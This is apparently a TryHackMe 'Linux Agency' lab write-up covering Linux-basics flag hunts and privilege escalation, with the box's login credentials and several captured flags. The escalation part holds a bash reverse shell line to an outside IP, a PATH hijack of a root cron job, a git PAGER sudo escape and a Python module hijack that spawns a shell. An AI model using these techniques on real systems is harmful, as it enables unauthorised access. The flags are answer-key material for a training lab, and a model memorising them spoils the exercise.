# TryHackMe-Linux Agency

First we are told to ssh into the box using the creds

username:agent47
password:640509040147


<img src="https://imgur.com/xTq6FqL.png"/>


## Linux Fundamentals

### Mission 1 Flag

As from the ssh banner we got the flag for mission 1

### Mission 2 Flag

Use the previous flag to login to `mission1` user

<img src="https://imgur.com/EUFK3OM.png"/>

In mission1's home directory you will find the flag for mission2 and you can the login with it to next user or in this case next mission

<img src="https://imgur.com/Uilbkxk.png"/>

### Mission 3 flag

<img src="https://imgur.com/ZBZ0UME.png"/>

Going to mission'2 home directory you will see `flag.txt` which holds flag for this mission

<img src="https://imgur.com/tfQW2DS.png"/>

### Mission 4 flag

Switch user to mission3 with the previous flag found

<img src="https://imgur.com/RdS5U80.png"/>

<img src="https://imgur.com/k2Zrcu3.png"/>

It seems there is no flag in the text file this time so we need to search around for the flag

Running `grep -rnw /home  -e 'mission4'` I saw end of the flag in the same message  

<img src="https://imgur.com/oThx6R9.png"/>

Opening it with `vi` editor I found the flag

<img src="https://imgur.com/EbD6idr.png"/>

### Mission 5 flag

Switch user to mission4 with the flag found

<img src="https://imgur.com/vPcGX4E.png"/>

Head over to mission's 5 home directory

<img src="https://imgur.com/QGjDon3.png"/>

And you'll find flag for the next mission

### Mission 6 flag

<img src="https://imgur.com/RmvIRjd.png"/>

<img src="https://imgur.com/nvk6be0.png"/>

### Mission 7 flag

<img src="https://imgur.com/m6IPueX.png"/>

<img src="https://imgur.com/ATbiM1N.png"/>

This was quite easy because all we have to do is `ls -la`

### Mission 8 flag

Using the previous flag switch to mission7 user

<img src="https://imgur.com/WYhHidT.png"/>

<img src="https://imgur.com/NRxf4zD.png"/>

### Mission 9 flag

<img src="https://imgur.com/wqWusfV.png"/>

<img src="https://imgur.com/632brR9.png"/>

There was no flag in the home directory let's see if we can find anything in root directory (/)

<img src="https://imgur.com/Hvesy2M.png"/>

### Mission 10 flag

<img src="https://imgur.com/cZ67Oj0.png"/>

<img src="https://imgur.com/MmF7QML.png"/>

We only see `rockyou.txt`

Doing a grep for `mission10` you will find your flag

<img src="https://imgur.com/7nHHjTB.png"/>

### Mission 11 flag

<img src="https://imgur.com/mNvTfst.png"/>

<img src="https://imgur.com/h4H27x0.png"/>

We see a bunch of directories in mission10's home directory so we have to look for mission11 string in these directories

<img src="https://imgur.com/n9dbHGO.png"/>

### Mission 12 flag

<img src="https://imgur.com/s9T3Isy.png"/>

Reading `.bashrc` 

<img src="https://imgur.com/51JCnZg.png"/>


### Mission 13 flag

<img src="https://imgur.com/d45ffiJ.png"/>

`flag.txt` is in home directory of mission13 but it doesn't have any permission so use chmod to change permissions

<img src="https://imgur.com/coY9MxC.png"/>


### Mission 14 flag

<img src="https://imgur.com/7SU1prM.png"/>

<img src="https://imgur.com/FjVcgVJ.png"/>

### Mission 15 flag

<img src="https://imgur.com/ghBKGwL.png"/>

<img src="https://imgur.com/Sp8staT.png"/>

This is looking like stream of binary so let's hop over to cyberchef

<img src="https://imgur.com/H0J3Bnm.png"/>


### Mission 16 flag

<img src="https://imgur.com/aGoga97.png"/>


<img src="https://imgur.com/fZkR77q.png"/>

This representation looks like hex because of `D` in the string

<img src="https://imgur.com/M2039Xd.png"/>

### Mission 17 flag

<img src="https://imgur.com/ATcVLEu.png"/>

<img src="https://imgur.com/IU8TbX5.png"/>

Here we have a `flag` binary but doesn't have any permissions so set execute flag on the binary 

<img src="https://imgur.com/iWGnP27.png"/>

### Mission 18 flag

<img src="https://imgur.com/9vw9gWp.png"/>

<img src="https://imgur.com/QpZjX8u.png"/>

It seems we have an ecnrypted string and which is being decrpyted so we need to run the java file to get the flag

<img src="https://imgur.com/Y829W2X.png"/>

### Mission 19 flag

<img src="https://imgur.com/DQMMd2i.png"/>

<img src="https://imgur.com/LvECvJz.png"/>

Here we have the same scenario but it is written in `ruby` language

<img src="https://imgur.com/cETObhD.png"/>

### Mission 20 flag

<img src="https://imgur.com/dV5KtQ6.png"/>

<img src="https://imgur.com/Fi9t3PG.png"/>

Again same thing we need to compile the c program and run it 

<img src="https://imgur.com/G4iBuKu.png"/>

### Mission 21 flag

<img src="https://imgur.com/G1oLob6.png"/>

<img src="https://imgur.com/ekyM2g9.png"/>

<img src="https://imgur.com/4mWNCws.png"/>

### Mission 22 flag

<img src="https://imgur.com/6C6tdKu.png"/>

<img src="https://imgur.com/XyEDeft.png"/>

Again the flag is hidden in `.bashrc`

### Mission 23 flag

<img src="https://imgur.com/76pgQ55.png"/>

We get spawn into a python interactive shell

<img src="https://imgur.com/bqEYc91.png"/>

<img src="https://imgur.com/Qq4kFG6.png"/>

### Mission 24 flag

<img src="https://imgur.com/IZT3V73.png"/>

<img src="https://imgur.com/dufKmce.png"/>

We get a message from text file but I didn't get it until I saw `/etc/hosts`

<img src="https://imgur.com/csntxIY.png"/>

Where localhost was resolving into `mission24.com` which tells that there is a webpage

<img src="https://imgur.com/4k8d8lC.png"/>

### Mission 25 flag

<img src="https://imgur.com/vHrRzP6.png"/>

<img src="https://imgur.com/WXOnyfu.png"/>

Here `bribe` is a binary file so on running

<img src="https://imgur.com/UZV9lVM.png"/>

Transfer the binary to your machine for analyzing 

<img src="https://imgur.com/xig1Y5y.png"/>

<img src="https://imgur.com/yWK94rl.png"/>

Right in the beginning we can it's storing an evniromental variable in a variable named `_s1` and it's checking if it contains the string "money" so we just have to export a variable named pocket with value money in terminal

<img src="https://imgur.com/aGsH8Ps.png"/>


### Mission 26 flag

<img src="https://imgur.com/Staohbt.png"/>

This tells me that there is something wrong with the PATH so let's export the PATH

<img src="https://imgur.com/iOXJZUm.png"/>

<img src="https://imgur.com/MXQoxzb.png"/>

### Mission 27 flag

<img src="https://imgur.com/Y0Wr41t.png"/>

<img src="https://imgur.com/MUuJCiH.png"/>

Running the `strings` command on the jpg file we will get our flag

<img src="https://imgur.com/uXZxvZ8.png"/>

### Mission 28 flag

<img src="https://imgur.com/jh8zS0M.png"/>

<img src="https://imgur.com/GhsOC7w.png"/>

Extract the archive (gzip) file I have transfered it to my machine 

<img src="https://imgur.com/28qUnBe.png"/>

Then use hexeditor to view the content in the jpg file which is acutally a gif image file

<img src="https://imgur.com/MtNWNPu.png"/>

### Mission 29 flag

<img src="https://imgur.com/elSXq4U.png"/>

<img src="https://imgur.com/oFTn1NU.png"/>

This `irb` is a ruby prompt

<img src="https://imgur.com/wdJvCje.png"/>

<img src="https://imgur.com/udbY3Om.png"/>


### Mission 30 flag

<img src="https://imgur.com/GzQqd9P.png"/>

<img src="https://imgur.com/i8YSaHk.png"/>

mission30{d25b4c9fac38411d2fcb4796171bda6e}

### Vikto's Flag

<img src="https://imgur.com/ktsMZJA.png"/>

<img src="https://imgur.com/88TpK3Q.png"/>

viktor{b52c60124c0f8f85fe647021122b3d9a}

## Privilege Escalation

### What is dalia's flag?

<img src="https://imgur.com/JqQx072.png"/>

<img src="https://imgur.com/LTsdoUq.png"/>

We can see a cronjob in which script is running as user `dalia`

But when we try to overwrite the content of the `47.sh` script it will not be executed because it is being paused with sleep 30 which wil pause the execution for 30 seconds and at the same the the same script will be overwritten as a root user and then the ownership will be changed to `viktor` so we need to somehow prevent the `sleep` command so we exploit PATH variable and replace the sleep command with anything 

<img src="https://imgur.com/Lt6PAD5.png"/>

Here as you can see I made a sleep file in which I just added a `bash` command which will not spawn a shell but will overwrite the actual sleep command

Added PATH variable for that file

<img src="https://imgur.com/9385ODD.png"/>

bash -i >& /dev/tcp/10.2.54.209/8080 0>&1

Add a netcat reverse shell

<img src="https://imgur.com/5s8cllq.png"/>

<img src="https://imgur.com/05W1VmY.png"/>

And boom we get a shell as user `dalia`

dalia{4a94a7a7bb4a819a63a33979926c77dc}

### What is silvio's flag?

Doing `sudo -l`

<img src="https://imgur.com/xAcO6ud.png"/>

We can see that this user can run `zip` as user `silvio`

<img src="https://imgur.com/rH3rg0t.png"/>

<img src="https://imgur.com/6kwOM7b.png"/>

silvio{657b4d058c03ab9988875bc937f9c2ef}

### What is reza's flag?

Running `sudo -l` on this user

<img src="https://imgur.com/5yCGbUT.png"/>

Now we will be able to escalate our privileges to rez through `git`

<img src="https://imgur.com/PvGii08.png"/>

```
sudo -u reza PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help

```
<img src="https://imgur.com/6bpBaQz.png"/>

<img src="https://imgur.com/XyPatAi.png"/>

reza{2f1901644eda75306f3142d837b80d3e}

### What is jordan's flag?

<img src="https://imgur.com/jSAYt8e.png"/>

Now this time we can run a python script as user `jordan`

<img src="https://imgur.com/iUQz8pE.png"/>

On running we get an error because there is no python module named `shop`. What we can do is create a python module in the same directory where the script is and in it spawn a shell.

echo 'import os;os.system("/bin/bash")'  > shop.py


(jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py


### What is ken's flag?

### What is sean's flag?

### What is penelope's flag?

### What is maya's flag?

### What is robert's Passphrase?

### What is user.txt?

### What is root.txt?


mission28{03556f8ca983ef4dc26d2055aef9770f}s